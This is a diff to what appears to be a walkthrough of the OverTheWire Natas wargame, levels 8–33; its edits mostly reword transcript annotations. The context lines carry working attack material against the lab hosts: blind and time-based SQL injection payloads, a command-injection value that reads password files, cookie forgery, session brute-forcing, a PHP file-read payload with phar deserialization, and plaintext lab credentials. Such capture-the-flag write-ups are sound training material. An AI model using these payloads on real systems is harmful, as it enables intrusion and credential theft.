@@ -269,8 +269,7 @@ Verification rule used throughout: a password is accepted only if a request to
   ```
   curl -s -u natas8:ugXL95KQmUAJJj6bMezOlBNDyI9Imwkc http://natas8.natas.labs.overthewire.org/index-source.html | sed "s/<[^>]*>//g; s/&nbsp;/ /g; s/&lt;/</g; s/&gt;/>/g" | grep -o '$encodedSecret = "[0-9a-f]*"'
   _Transcript note:_ this one-liner is typed into `vim` as `/tmp/n8_1c.py` and run as `python3 /tmp/n8_1c.py`.
-  python3 -c "import base64;h='3d3d516343746d4d6d6c315669563362';s=bytes.fromhex(h).decode()[::-1];print(base64.b64decode(s).decode())"
-
+  python3 /tmp/n8_1c.py
   curl -s -u natas8:ugXL95KQmUAJJj6bMezOlBNDyI9Imwkc -d "secret=oubWYf2kBq&submit=1" http://natas8.natas.labs.overthewire.org/ | grep -i granted
   ```
 ### Step-by-step discovery and crafting (what the recording shows)
@@ -287,8 +286,8 @@ Verification rule used throughout: a password is accepted only if a request to
    ```
 2. **Invert the pipeline, last operation first.** The encoder is base64 → reverse → hex. To undo it: hex-decode → reverse → base64-decode.
    ```
-   _Transcript note:_ this one-liner is typed into `vim` as `/tmp/n8_1c.py` and run as `python3 /tmp/n8_1c.py`.
-  python3 -c "import base64;h='3d3d516343746d4d6d6c315669563362';s=bytes.fromhex(h).decode()[::-1];print(base64.b64decode(s).decode())"
+   _Transcript note:_ the typed file is exactly the one-liner below, run as `python3 /tmp/n8_1c.py`.
+   python3 -c "import base64;h='3d3d516343746d4d6d6c315669563362';s=bytes.fromhex(h).decode()[::-1];print(base64.b64decode(s).decode())"
 
    # oubWYf2kBq
    ```
@@ -374,7 +373,7 @@ Verification rule used throughout: a password is accepted only if a request to
 - **Commands:**
   ```
   curl -s -D- -o /dev/null -u natas11:VUMQDmuITOEHzhviLE5V0VG9cPMQkyxd http://natas11.natas.labs.overthewire.org/ | grep -i set-cookie
-_Transcript note:_ this is typed into `vim` chunk by chunk in the level transcript (saved as `/tmp/n<level>_<step>.py`) before it runs.
+_Transcript note:_ this helper is typed stage by stage into `vim` in the level transcript (level 11's transcript) before it runs; the heredoc below is the same code.
   python3 - <<'PY'
   import base64, urllib.parse, json
   c = 'EGAgHwQ1IxYYMSQYGSZxTUksPFVHYDEQCC0%2FGBlgaVVIJDURDSQ1VRY%3D'
@@ -406,7 +405,7 @@ _Transcript note:_ this is typed into `vim` chunk by chunk in the level transcri
    ```
 3. **Recover the key from known plaintext.** The default object is `{"showpassword":"no","bgcolor":"#ffffff"}` — we know it exactly. XOR is its own inverse, so XORing the decoded cookie with that plaintext gives the keystream; because the key repeats, the first four bytes reveal it:
    ```
-_Transcript note:_ this is typed into `vim` chunk by chunk in the level transcript (saved as `/tmp/n<level>_<step>.py`) before it runs.
+_Transcript note:_ this helper is typed stage by stage into `vim` in the level transcript (level 11's transcript) before it runs; the heredoc below is the same code.
    python3 - <<'PY'
    import base64, urllib.parse
    ct = base64.b64decode(urllib.parse.unquote('EGAgHwQ1IxYYMSQYGSZxTUksPFVHYDEQCC0%2FGBlgaVVIJDURDSQ1VRY%3D'))
@@ -418,7 +417,7 @@ _Transcript note:_ this is typed into `vim` chunk by chunk in the level transcri
    The recording prints `recovered key: b'kBSw'`. (The trailing bytes of the plaintext/ciphertext pair are shorter than the JSON; only the first key period is needed.)
 4. **Forge the new cookie.** Encrypt `{"showpassword":"yes","bgcolor":"#ffffff"}` with the recovered key, base64-encode, and URL-encode it for the header:
    ```
-_Transcript note:_ this is typed into `vim` chunk by chunk in the level transcript (saved as `/tmp/n<level>_<step>.py`) before it runs.
+_Transcript note:_ this helper is typed stage by stage into `vim` in the level transcript (level 11's transcript) before it runs; the heredoc below is the same code.
    python3 - <<'PY'
    import base64, urllib.parse, json
    key = b'kBSw'
@@ -559,7 +558,7 @@ _Transcript note:_ this is typed into `vim` chunk by chunk in the level transcri
   ```
   curl -s -u natas15:GB6USCJYJjwLyYhZUNkE1NwDueiTow6g http://natas15.natas.labs.overthewire.org/index-source.html | sed "s/&nbsp;/ /g; s/<[^>]*>//g" | tr -d "\n" | grep -o "SELECT [^;]*;" | head -1
   curl -s -u natas15:GB6USCJYJjwLyYhZUNkE1NwDueiTow6g --data-urlencode 'username=natas16" AND password LIKE "%' http://natas15.natas.labs.overthewire.org/ | grep -i "exists"
-_Transcript note:_ this is typed into `vim` chunk by chunk in the level transcript (saved as `/tmp/n<level>_<step>.py`) before it runs.
+_Transcript note:_ this helper is typed stage by stage into `vim` in the level transcript (level 15's transcript) before it runs; the heredoc below is the same code.
   python3 - <<'PY'
   import urllib.request, urllib.parse, base64
   url = 'http://natas15.natas.labs.overthewire.org/'
@@ -605,7 +604,7 @@ _Transcript note:_ this is typed into `vim` chunk by chunk in the level transcri
    Binary search over ASCII 32..126 needs about 7 requests per character, instead of up to 95.
 4. **Drive it from Python.** The recording uses `urllib` with the Basic auth header built by hand, because the loop makes dozens of requests:
    ```
-_Transcript note:_ this is typed into `vim` chunk by chunk in the level transcript (saved as `/tmp/n<level>_<step>.py`) before it runs.
+_Transcript note:_ this helper is typed stage by stage into `vim` in the level transcript (level 15's transcript) before it runs; the heredoc below is the same code.
    python3 - <<'PY'
    import urllib.request, urllib.parse, base64
    url = 'http://natas15.natas.labs.overthewire.org/'
@@ -644,7 +643,7 @@ _Transcript note:_ this is typed into `vim` chunk by chunk in the level transcri
   curl -s -u natas16:Xm6XEeRN3zsGjRDqBPmuqAVV65k7e3Gb http://natas16.natas.labs.overthewire.org/index-source.html | sed "s/&nbsp;/ /g; s/<[^>]*>//g; s/&lt;/</g; s/&gt;/>/g" | tr -d "\n" | grep -o "preg_match([^)]*)"
   echo -n "matching prefix ^K -> "; curl -s -u natas16:Xm6XEeRN3zsGjRDqBPmuqAVV65k7e3Gb --data-urlencode 'needle=$(grep ^K /etc/natas_webpass/natas17)' http://natas16.natas.labs.overthewire.org/ | sed -n "/<pre>/,/<\/pre>/p" | wc -c
   echo -n "non-matching prefix ^Z -> "; curl -s -u natas16:Xm6XEeRN3zsGjRDqBPmuqAVV65k7e3Gb --data-urlencode 'needle=$(grep ^Z /etc/natas_webpass/natas17)' http://natas16.natas.labs.overthewire.org/ | sed -n "/<pre>/,/<\/pre>/p" | wc -c
-_Transcript note:_ this is typed into `vim` chunk by chunk in the level transcript (saved as `/tmp/n<level>_<step>.py`) before it runs.
+_Transcript note:_ this helper is typed stage by stage into `vim` in the level transcript (level 16's transcript) before it runs; the heredoc below is the same code.
   python3 - <<'PY'
   import urllib.request, urllib.parse, base64
   url = 'http://natas16.natas.labs.overthewire.org/'
@@ -697,7 +696,7 @@ _Transcript note:_ this is typed into `vim` chunk by chunk in the level transcri
    The recording prints both sizes, which makes the difference unmistakable.
 4. **Binary-search the alphabet per position.** Use a bracket class, which needs no quotes and is not filtered: `grep ^<known prefix>[<range>] /etc/natas_webpass/natas17`. The Python driver splits the candidate alphabet `[0-9A-Za-z]` in half each step:
    ```
-_Transcript note:_ this is typed into `vim` chunk by chunk in the level transcript (saved as `/tmp/n<level>_<step>.py`) before it runs.
+_Transcript note:_ this helper is typed stage by stage into `vim` in the level transcript (level 16's transcript) before it runs; the heredoc below is the same code.
    python3 - <<'PY'
    # (script in the recording)
    # empty(f'$(grep ^{prefix}[{CHARS[lo:mid+1]}] /etc/natas_webpass/natas17)')
@@ -724,7 +723,7 @@ _Transcript note:_ this is typed into `vim` chunk by chunk in the level transcri
   echo -n "true condition  -> "; s=$(date +%s.%N); curl -s -m 90 -o /dev/null -u natas17:KLdAM3VZux8o6TbkbhuaG5KtYjI77tfx --data-urlencode 'username=x" OR IF(1=1,SLEEP(5),0)-- -' http://natas17.natas.labs.overthewire.org/; e=$(date +%s.%N); python3 -c "print('%.1f s' % ($e - $s))"
   echo -n "false condition -> "; s=$(date +%s.%N); curl -s -m 90 -o /dev/null -u natas17:KLdAM3VZux8o6TbkbhuaG5KtYjI77tfx --data-urlencode 'username=x" OR IF(1=2,SLEEP(5),0)-- -' http://natas17.natas.labs.overthewire.org/; e=$(date +%s.%N); python3 -c "print('%.1f s' % ($e - $s))"
   echo -n "length = 32     -> "; s=$(date +%s.%N); curl -s -m 90 -o /dev/null -u natas17:KLdAM3VZux8o6TbkbhuaG5KtYjI77tfx --data-urlencode 'username=x" OR IF((SELECT LENGTH(password) FROM users WHERE username="natas18")=32,SLEEP(5),0)-- -' http://natas17.natas.labs.overthewire.org/; e=$(date +%s.%N); python3 -c "print('%.1f s' % ($e - $s))"
-_Transcript note:_ this is typed into `vim` chunk by chunk in the level transcript (saved as `/tmp/n<level>_<step>.py`) before it runs.
+_Transcript note:_ this helper is typed stage by stage into `vim` in the level transcript (level 17's transcript) before it runs; the heredoc below is the same code.
   python3 - <<'PY'
   import subprocess, time
   BASE = 'http://natas17.natas.labs.overthewire.org/'
@@ -779,7 +778,7 @@ _Transcript note:_ this is typed into `vim` chunk by chunk in the level transcri
    moves the lower bound up, a false one moves it down, so each character takes
    ~7 requests.
    ```
-_Transcript note:_ this is typed into `vim` chunk by chunk in the level transcript (saved as `/tmp/n<level>_<step>.py`) before it runs.
+_Transcript note:_ this helper is typed stage by stage into `vim` in the level transcript (level 17's transcript) before it runs; the heredoc below is the same code.
    python3 - <<'PY'
    # (script in the recording: timed() measures curl; cond() = timed > 2.5 s)
    # for pos in 1..32: binary search lo/hi in [32,127] with ORD(...) >= mid
@@ -803,7 +802,7 @@ _Transcript note:_ this is typed into `vim` chunk by chunk in the level transcri
 - **Commands:**
   ```
   curl -s -u natas18:fDGn2A6Gsc0BUp3bZw0RNXpg0PZt40op http://natas18.natas.labs.overthewire.org/index-source.html | sed "s/&nbsp;/ /g; s/<[^>]*>//g; s/&lt;/</g; s/&gt;/>/g" | tr -d "\n" | grep -o "maxid = 640"
-_Transcript note:_ this is typed into `vim` chunk by chunk in the level transcript (saved as `/tmp/n<level>_<step>.py`) before it runs.
+_Transcript note:_ this helper is typed stage by stage into `vim` in the level transcript (level 18's transcript) before it runs; the heredoc below is the same code.
   python3 - <<'PY'
   import urllib.request, base64
   url = "http://natas18.natas.labs.overthewire.org/"
@@ -846,7 +845,7 @@ _Transcript note:_ this is typed into `vim` chunk by chunk in the level transcri
 - **Commands:**
   ```
   curl -s -u natas19:qvwtMqAcVSBlf7HE3sw9pljhqqPF9MMT http://natas19.natas.labs.overthewire.org/index-source.html | sed "s/&nbsp;/ /g; s/<[^>]*>//g; s/&lt;/</g; s/&gt;/>/g" | grep -o "idstr = [^;]*" | head -2
-_Transcript note:_ this is typed into `vim` chunk by chunk in the level transcript (saved as `/tmp/n<level>_<step>.py`) before it runs.
+_Transcript note:_ this helper is typed stage by stage into `vim` in the level transcript (level 19's transcript) before it runs; the heredoc below is the same code.
   python3 - <<'PY'
   import urllib.request, base64
   url = "http://natas19.natas.labs.overthewire.org/"
@@ -891,7 +890,7 @@ _Transcript note:_ this is typed into `vim` chunk by chunk in the level transcri
 - **Commands:**
   ```
   curl -s -u natas20:slOKYGsjlJhaqKliGvrgWAzln0JyrWao http://natas20.natas.labs.overthewire.org/index-source.html | sed "s/&nbsp;/ /g; s/<[^>]*>//g; s/&lt;/</g; s/&gt;/>/g" | tr -d "\n" | grep -o "function myread[^}]*}\|function mywrite[^}]*}" | head -c 700
-_Transcript note:_ this is typed into `vim` chunk by chunk in the level transcript (saved as `/tmp/n<level>_<step>.py`) before it runs.
+_Transcript note:_ this helper is typed stage by stage into `vim` in the level transcript (level 20's transcript) before it runs; the heredoc below is the same code.
   python3 - <<'PY'
   import urllib.request, urllib.parse, base64, http.cookiejar
   auth = "Basic " + base64.b64encode(b"natas20:slOKYGsjlJhaqKliGvrgWAzln0JyrWao").decode()
@@ -928,7 +927,7 @@ _Transcript note:_ this is typed into `vim` chunk by chunk in the level transcri
 - **Commands:**
   ```
   curl -s -u natas21:7meHZ1l2zPoK2v1qfTUxq4Ydfja4UlmU http://natas21-experimenter.natas.labs.overthewire.org/index-source.html | sed "s/&nbsp;/ /g; s/<[^>]*>//g; s/&lt;/</g; s/&gt;/>/g" | tr -d "\n" | grep -o "foreach(\$_REQUEST[^}]*}"
-_Transcript note:_ this is typed into `vim` chunk by chunk in the level transcript (saved as `/tmp/n<level>_<step>.py`) before it runs.
+_Transcript note:_ this helper is typed stage by stage into `vim` in the level transcript (level 21's transcript) before it runs; the heredoc below is the same code.
   python3 - <<'PY'
   import urllib.request, urllib.parse, base64
   auth = "Basic " + base64.b64encode(b"natas21:7meHZ1l2zPoK2v1qfTUxq4Ydfja4UlmU").decode()
@@ -1097,7 +1096,7 @@ _Transcript note:_ this is typed into `vim` chunk by chunk in the level transcri
   curl -s -u natas26:3CApdpjqI4UYPxY8mHQWUdFPGH9BoUTT http://natas26.natas.labs.overthewire.org/index-source.html | sed "s/&nbsp;/ /g; s/<[^>]*>//g; s/&lt;/</g; s/&gt;/>/g" | tr -d "\n" | sed "s/    /\n/g" | grep -E "class Logger|private \$|function __|logFile|unserialize"
   curl -s -c /tmp/n26.jar -u natas26:3CApdpjqI4UYPxY8mHQWUdFPGH9BoUTT http://natas26.natas.labs.overthewire.org/ -o /dev/null
   SID=$(awk '/PHPSESSID/{print $7}' /tmp/n26.jar); echo "PHPSESSID=$SID"
-_Transcript note:_ this is typed into `vim` chunk by chunk in the level transcript (saved as `/tmp/n<level>_<step>.py`) before it runs.
+_Transcript note:_ this helper is typed stage by stage into `vim` in the level transcript (level 26's transcript) before it runs; the heredoc below is the same code.
   python3 - <<'PY'
   import base64
   sid = open('/tmp/n26.jar').read().split('PHPSESSID')[1].split()[0]
@@ -1171,7 +1170,7 @@ _Transcript note:_ this is typed into `vim` chunk by chunk in the level transcri
 - **Commands:**
   ```
   curl -s -u natas27:mj2mBEPWycXTTg5BXYT7UPXgXHx5hjvV http://natas27.natas.labs.overthewire.org/index-source.html | sed "s/&nbsp;/ /g; s/<[^>]*>//g; s/&lt;/</g; s/&gt;/>/g" | tr -d "\n" | sed "s/    /\n/g" | grep -E "CREATE TABLE|varchar|substr|trim|INSERT|SELECT"
-_Transcript note:_ this is typed into `vim` chunk by chunk in the level transcript (saved as `/tmp/n<level>_<step>.py`) before it runs.
+_Transcript note:_ this helper is typed stage by stage into `vim` in the level transcript (level 27's transcript) before it runs; the heredoc below is the same code.
   python3 - <<'PY'
   import urllib.request, urllib.parse, base64, re
   auth = "Basic " + base64.b64encode(b"natas27:mj2mBEPWycXTTg5BXYT7UPXgXHx5hjvV").decode()
@@ -1215,7 +1214,7 @@ _Transcript note:_ this is typed into `vim` chunk by chunk in the level transcri
 
 - **Commands:**
   ```
-_Transcript note:_ this is typed into `vim` chunk by chunk in the level transcript (saved as `/tmp/n<level>_<step>.py`) before it runs.
+_Transcript note:_ this helper is typed stage by stage into `vim` in the level transcript (level 28's transcript) before it runs; the heredoc below is the same code.
   python3 - <<'PY'
   import urllib.request, urllib.parse, base64, urllib.error
   auth = "Basic " + base64.b64encode(b"natas28:Hy5wZLfVml7jnGmuvfbilRTUUkk29Dv3").decode()
@@ -1242,7 +1241,7 @@ _Transcript note:_ this is typed into `vim` chunk by chunk in the level transcri
       raw = ct_for("a" * n)
       print("   a*%-2d ->" % n, [raw[i:i+16].hex()[:12] for i in range(0, len(raw), 16)])
   PY
-_Transcript note:_ this is typed into `vim` chunk by chunk in the level transcript (saved as `/tmp/n<level>_<step>.py`) before it runs.
+_Transcript note:_ this helper is typed stage by stage into `vim` in the level transcript (level 28's transcript) before it runs; the heredoc below is the same code.
   python3 - <<'PY'
   import urllib.request, urllib.parse, base64, urllib.error
   auth = "Basic " + base64.b64encode(b"natas28:Hy5wZLfVml7jnGmuvfbilRTUUkk29Dv3").decode()
@@ -1423,7 +1422,7 @@ _Transcript note:_ this is typed into `vim` chunk by chunk in the level transcri
   curl -s -u natas33:kmIpGpPfpBF529wy1C8FGb9ZSO7fTlKL http://natas33.natas.labs.overthewire.org/index-source.html | sed "s/<[^>]*>//g; s/&nbsp;/ /g; s/&lt;/</g; s/&gt;/>/g; s/&quot;/\"/g" | tr -d "\n" | sed "s/    /\n/g" | grep -aE "class Executor|private \$|md5_file|passthru|move_uploaded_file" | head -8
   printf '<?php echo file_get_contents("/etc/natas_webpass/natas34"); ?>' > /tmp/n33payload.php
   md5sum /tmp/n33payload.php
-_Transcript note:_ this is typed into `vim` chunk by chunk in the level transcript (saved as `/tmp/n<level>_<step>.py`) before it runs.
+_Transcript note:_ this helper is typed stage by stage into `vim` in the level transcript (level 33's transcript) before it runs; the heredoc below is the same code.
   python3 - <<'PY'
   import struct, zlib, hashlib
   payload = open('/tmp/n33payload.php','rb').read()
@@ -1458,7 +1457,7 @@ _Transcript note:_ this is typed into `vim` chunk by chunk in the level transcri
 2. **Write the payload.** `<?php echo file_get_contents("/etc/natas_webpass/natas34"); ?>` → md5 `8a54d751b7e2bbbb2643d355d49e81be`.
 3. **Build the phar** whose metadata is `O:8:"Executor":3:{s:18:"\x00Executor\x00filename";s:19:"/tmp/n33payload.php";s:19:"\x00Executor\x00signature";s:32:"8a54d751...";s:14:"\x00Executor\x00init";b:0;}`:
    ```
-_Transcript note:_ this is typed into `vim` chunk by chunk in the level transcript (saved as `/tmp/n<level>_<step>.py`) before it runs.
+_Transcript note:_ this helper is typed stage by stage into `vim` in the level transcript (level 33's transcript) before it runs; the heredoc below is the same code.
    python3 - <<'PY'
    import struct, zlib, hashlib
    ... (the writer shown in the Commands block above; it emits the stub, the
